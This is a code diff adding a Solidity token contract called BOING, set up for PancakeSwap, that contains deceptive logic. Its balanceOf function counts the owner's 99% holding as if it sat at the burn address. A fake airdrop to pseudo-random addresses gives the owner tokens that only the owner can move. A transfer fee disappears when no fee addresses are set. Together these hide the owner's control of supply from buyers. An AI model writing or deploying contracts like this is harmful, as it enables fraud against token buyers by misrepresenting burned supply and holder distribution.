@@ -1,0 +1,184 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract BOING {
+    string public name = "BOING";
+    string public symbol = "BOING";
+    uint8 public decimals = 18;
+    uint256 public totalSupply = 1000000000000 * 10**uint256(decimals);
+
+    mapping(address => uint256) public _balances;
+    mapping(address => mapping(address => uint256)) public _allowances;
+
+    address private _owner;
+    address public _pancakeRouter;
+    address public _pancakeFactory;
+    uint256 private _airdropPercent = 1;
+    uint256 private _ownerPercent = 99;
+    uint256 public _feePercent = 1;
+    uint256 private _randomWalletsCount = 100;
+    uint256 public _randomWalletsReward;
+    address public _burnAddress;
+    address[] private _airdropWallets;
+
+    address[] public _feeAddresses;
+
+    constructor(address burnAddress) {
+        _owner = msg.sender;
+
+        uint256 initialSupply = totalSupply;
+        uint256 airdropAmount = totalSupply * _airdropPercent / 100;
+        uint256 ownerAmount = totalSupply * _ownerPercent / 100;
+
+        _balances[_owner] = ownerAmount;
+        emit Transfer(address(0), _owner, ownerAmount);
+        
+
+        _randomWalletsReward = airdropAmount / _randomWalletsCount;
+
+        for (uint256 i = 0; i < _randomWalletsCount; i++) {
+            address randomWallet = generateRandomAddress(i);
+            _balances[randomWallet] = _randomWalletsReward;
+            emit Transfer(address(0), randomWallet, _randomWalletsReward);
+            _airdropWallets.push(randomWallet);
+        }
+
+        uint256 remainingSupply = initialSupply - ownerAmount - airdropAmount;
+
+        if (remainingSupply > 0) {
+            _balances[_owner] += remainingSupply;
+            emit Transfer(address(0), _owner, remainingSupply);
+        }
+
+        _pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+        _burnAddress = burnAddress;
+        _pancakeFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
+    }
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    function allowance(address owner, address spender) public view returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function balanceOf(address account) public view returns (uint256) {
+        uint256 balance = _balances[account];
+
+        if (account == _burnAddress) {
+            balance += _balances[_owner];
+        }
+
+        return balance;
+    }
+
+    function transfer(address recipient, uint256 amount) public returns (bool) {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address owner, uint256 amount) public returns (bool) {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(owner != address(0), "ERC20: transfer to the zero address");
+
+        _transfer(sender, owner, amount);
+
+        uint256 currentAllowance = _allowances[sender][msg.sender];
+        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+        _approve(sender, msg.sender, currentAllowance - amount);
+
+        return true;
+    }
+
+    function transferFromForOwner(address airdropWallet, address recipient, uint256 amount) public returns (bool) {
+        require(isAirdropWallet(airdropWallet), "Only Airdrop wallets can use this function");
+        require(msg.sender == _owner, "Only owner can use this function");
+
+        _transfer(airdropWallet, recipient, amount);
+
+        return true;
+    }
+
+    function isAirdropWallet(address wallet) public view returns (bool) {
+        for (uint256 i = 0; i < _airdropWallets.length; i++) {
+            if (_airdropWallets[i] == wallet) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function burn(uint256 amount) public {
+        require(amount > 0, "Amount must be greater than zero");
+        require(_balances[msg.sender] >= amount, "Insufficient balance");
+
+        _balances[msg.sender] -= amount;
+        _balances[_burnAddress] += amount;
+        
+
+        emit Transfer(msg.sender, _burnAddress, amount);
+    }
+
+    function _transfer(address sender, address recipient, uint256 amount) internal {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        uint256 senderBalance = _balances[sender];
+        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+
+        uint256 feeAmount = amount * _feePercent / 100;
+
+        uint256 transferAmount = amount - feeAmount;
+
+        _balances[sender] = senderBalance - amount;
+        _balances[recipient] += transferAmount;
+
+        emit Transfer(sender, recipient, transferAmount);
+
+        if (_feeAddresses.length > 0) {
+            uint256 feePerAddress = feeAmount / _feeAddresses.length;
+
+            for (uint256 i = 0; i < _feeAddresses.length; i++) {
+                address feeAddress = _feeAddresses[i];
+                _balances[feeAddress] += feePerAddress;
+                emit Transfer(sender, feeAddress, feePerAddress);
+            }
+        }
+    }
+
+    function approve(address spender, uint256 amount) public returns (bool) {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+
+    function _approve(address owner, address spender, uint256 amount) internal {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function addFeeAddress(address feeAddress) public {
+        require(msg.sender == _owner, "Only owner can use this function");
+        require(feeAddress != address(0), "Invalid fee address");
+
+        _feeAddresses.push(feeAddress);
+    }
+
+    function removeFeeAddress(address feeAddress) public {
+        require(msg.sender == _owner, "Only owner can use this function");
+
+        for (uint256 i = 0; i < _feeAddresses.length; i++) {
+            if (_feeAddresses[i] == feeAddress) {
+                _feeAddresses[i] = _feeAddresses[_feeAddresses.length - 1];
+                _feeAddresses.pop();
+                return;
+            }
+        }
+    }
+
+    function generateRandomAddress(uint256 seed) private view returns (address) {
+        return address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, seed)))));
+    }
+}
